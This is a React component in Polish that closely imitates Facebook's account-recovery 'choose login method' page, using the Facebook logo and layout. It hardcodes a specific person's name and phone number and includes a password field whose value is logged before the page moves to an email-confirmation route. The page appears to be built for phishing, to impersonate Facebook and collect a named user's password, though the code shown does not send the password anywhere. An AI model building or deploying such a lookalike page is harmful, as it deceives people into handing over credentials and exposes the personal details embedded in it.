import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { ChevronLeft } from 'lucide-react'
import AuthButton from '~/components/AuthButton'
import CustomInput from '~/components/CustomInput'

export const FacebookIcon: React.FC<{ size?: number; className?: string }> = ({ size = 24, className = '' }) => (
  <svg
    viewBox="0 0 36 36"
    className={className}
    style={{ width: size, height: size }}
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-8.954h-2.923v-4.144H14v-2.828c0-4.11 2.366-6.155 5.894-6.155 1.516 0 2.871.189 3.328.283v3.743l-2.079.001c-1.895 0-2.391 1.054-2.391 2.314v2.641h4.298l-.666 4.144h-3.632v9.825z" />
  </svg>
)

export const ResetPasswordPage: React.FC = () => {
  const navigate = useNavigate()
  const [selectedMethod, setSelectedMethod] = useState<'sms' | 'password'>('sms')
  const [password, setPassword] = useState('')

  const goBack = () => {
    navigate(-1)
  }

  const onContinue = () => {
    console.log('Wybrano metodę:', selectedMethod)
    if (selectedMethod === 'password') {
      console.log('Hasło:', password)
    }
    navigate('/confirmemail')
  }

  const onNotYou = () => {
    console.log('To nie ja - akcja')
    navigate('/')
  }

  return (
    <div className="min-h-screen bg-white font-sans text-[#1c1e21] flex flex-col">
      <div className="flex-1 flex justify-center pt-8 px-4">
        <div className="w-full max-w-[500px] text-left">
          <div className="mb-5">
            <button
              type="button"
              className="text-[#606770] hover:bg-gray-100 p-2 rounded-full transition-colors focus:outline-none mb-2 -ml-2 cursor-pointer"
              onClick={goBack}
            >
              <ChevronLeft size={28} />
            </button>
            <h1 className="text-[24px] font-bold text-left">
              Wybierz sposób logowania
            </h1>
          </div>

          <div className="border border-[#ced0d4] rounded-xl p-4 flex items-center mb-6">
            <div className="relative mr-4 shrink-0">
              <img
                src="https://i.pravatar.cc/150?img=11"
                alt="Avatar"
                className="w-14 h-14 rounded-full object-cover"
              />
              <div className="absolute -bottom-1 -right-1 bg-white rounded-full p-[2px]">
                <div className="bg-[#1877f2] text-white rounded-full w-5 h-5 flex items-center justify-center">
                  <FacebookIcon size={14} />
                </div>
              </div>
            </div>
            <div>
              <div className="font-semibold text-[17px] leading-tight mb-0.5">
                Bartosz Miazek
              </div>
              <div className="text-[#606770] text-[15px] leading-tight">
                Facebook
              </div>
            </div>
          </div>

          <div className="border border-[#ced0d4] rounded-xl mb-6 overflow-hidden">
            <label className="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50 transition-colors">
              <div>
                <div className="font-medium text-[16px]">Uzyskaj kod przez SMS</div>
                <div className="text-[#606770] text-[14px] mt-0.5">+48517419808</div>
              </div>
              <div
                className={`w-6 h-6 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors ${
                  selectedMethod === 'sms' ? 'border-[#1877f2]' : 'border-[#8d949e]'
                }`}
              >
                {selectedMethod === 'sms' && (
                  <div className="w-3 h-3 bg-[#1877f2] rounded-full" />
                )}
              </div>
              <input
                name="reset-method"
                type="radio"
                checked={selectedMethod === 'sms'}
                onChange={() => setSelectedMethod('sms')}
                className="hidden"
              />
            </label>

            <hr className="border-[#ced0d4] mx-4" />

            <label className="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50 transition-colors">
              <div>
                <div className="font-medium text-[16px]">Kontynuuj przy użyciu hasła</div>
                <div className="text-[#606770] text-[14px] mt-0.5">Użyj hasła, aby kontynuować</div>
              </div>
              <div
                className={`w-6 h-6 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors ${
                  selectedMethod === 'password' ? 'border-[#1877f2]' : 'border-[#8d949e]'
                }`}
              >
                {selectedMethod === 'password' && (
                  <div className="w-3 h-3 bg-[#1877f2] rounded-full" />
                )}
              </div>
              <input
                name="reset-method"
                type="radio"
                checked={selectedMethod === 'password'}
                onChange={() => setSelectedMethod('password')}
                className="hidden"
              />
            </label>
          </div>

          {selectedMethod === 'password' && (
            <div className="mb-6">
              <CustomInput
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                label="Wprowadź hasło"
                disableFocusColor={true}
              />
            </div>
          )}

          <div className="text-center mb-8">
            <a
              href="#"
              className="text-[#1877f2] hover:underline font-medium text-[14px]"
            >
              Nie masz już do nich dostępu?
            </a>
          </div>

          <div className="flex flex-col gap-3">
            <AuthButton onClick={onContinue}>
              Kontynuuj
            </AuthButton>

            <button
              className="w-full bg-white border border-[#ced0d4] text-[#1c1e21] font-semibold text-[16px] rounded-full py-3 hover:bg-gray-50 transition-colors focus:outline-none cursor-pointer"
              onClick={onNotYou}
            >
              To nie Ty?
            </button>
          </div>
        </div>
      </div>

      <div className="mt-auto pt-10 pb-6 px-4 flex flex-col items-center">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] text-[#606770] max-w-[800px] mb-4">
          <span className="text-[#1c1e21] font-semibold">Polski</span>
          <a href="#" className="hover:underline">English (US)</a>
          <a href="#" className="hover:underline">ślōnskŏ gŏdka</a>
          <a href="#" className="hover:underline">Русский</a>
          <a href="#" className="hover:underline">Deutsch</a>
          <a href="#" className="hover:underline">Français (France)</a>
          <a href="#" className="hover:underline">Italiano</a>
          <a href="#" className="hover:underline font-semibold">Więcej języków...</a>
        </div>
        <div className="w-full max-w-[800px] border-t border-gray-200 pt-4 flex flex-wrap justify-center gap-x-4 gap-y-2 text-[12px] text-[#606770]">
          <a href="#" className="hover:underline">Zarejestruj się</a>
          <a href="#" className="hover:underline">Zaloguj się</a>
          <a href="#" className="hover:underline">Messenger</a>
          <a href="#" className="hover:underline">Facebook Lite</a>
          <a href="#" className="hover:underline">Film</a>
          <a href="#" className="hover:underline">Meta Pay</a>
        </div>
      </div>
    </div>
  )
}

export default ResetPasswordPage
